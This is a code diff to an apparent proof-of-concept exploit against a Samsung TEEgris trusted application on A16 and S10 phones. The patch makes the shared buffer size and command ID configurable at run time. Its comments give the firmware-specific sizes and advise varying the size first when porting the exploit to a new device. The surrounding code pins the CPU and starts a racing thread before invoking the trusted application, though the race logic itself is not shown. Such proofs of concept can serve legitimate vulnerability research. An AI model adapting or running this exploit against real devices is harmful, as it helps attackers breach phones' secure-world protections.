@@ -68,6 +68,13 @@ typedef struct pls{
     uint64_t ptr;
 }pls;
 
+/* The size the TA accepts differs per firmware: 0x212214 on the A16 (whose TA
+ * binary is in ../a16/), 0x212010 on the S10. Anything else is rejected with
+ * TEEC_ERROR_SHORT_BUFFER before the TA touches the buffer, so it is the first
+ * thing to vary on a new device. Override at run time: ./poc [size] [cmd]. */
+static size_t buf_size = 0x212214;
+static uint32_t cmd_id = 0x11;
+
 void send_req(TEEC_Context *context, TEEC_Session *session)
 {
     cpu_set_t set;
@@ -79,7 +86,6 @@ void send_req(TEEC_Context *context, TEEC_Session *session)
     op.paramTypes = TEEC_PARAM_TYPES(TEEC_MEMREF_WHOLE, TEEC_NONE,
                                      TEEC_NONE, TEEC_NONE);
     printf("params: 0x%lx\n", op.paramTypes);
-    size_t buf_size = 0x212214; // 0x212010 for s10
     char* buf = (char*)malloc(buf_size);
     TEEC_Result res; 
     memset(buf, 0, buf_size);
@@ -113,14 +119,17 @@ void send_req(TEEC_Context *context, TEEC_Session *session)
         perror("pthread_create failed");
         return;
     }
-    //res = TEEC_InvokeCommand_impl(session, 0x12, &op, &err_origin);
-    res = TEEC_InvokeCommand_impl(session, 0x11, &op, &err_origin);
+    res = TEEC_InvokeCommand_impl(session, cmd_id, &op, &err_origin);
     printf("TEEC_Result: %x origin: err_origin: %x\n", res, err_origin);
 }
 
 
 int main(int argc, char **argv)
 {
+    if (argc > 1) buf_size = (size_t)strtoull(argv[1], NULL, 0);
+    if (argc > 2) cmd_id = (uint32_t)strtoul(argv[2], NULL, 0);
+    printf("buf_size 0x%zx cmd 0x%x\n", buf_size, cmd_id);
+
     char* ta = "00000000-0000-0000-0000-5345435f4652";
     TEEC_UUID *uuid = teegris_uuid(ta); 
 
